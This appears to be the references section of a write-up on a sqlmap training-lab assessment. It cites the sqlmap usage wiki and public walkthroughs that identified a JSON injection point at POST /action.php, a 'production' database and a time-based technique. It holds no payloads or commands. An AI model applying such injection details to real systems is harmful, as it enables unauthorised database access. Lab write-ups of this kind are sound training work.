- sqlmap project and usage wiki: https://github.com/sqlmapproject/sqlmap/wiki/usage
- Public walkthroughs of the Skills Assessment were consulted to identify the `POST /action.php` JSON vector, the `production` database and the time-based technique; they are not a substitute for the author's own captured evidence.
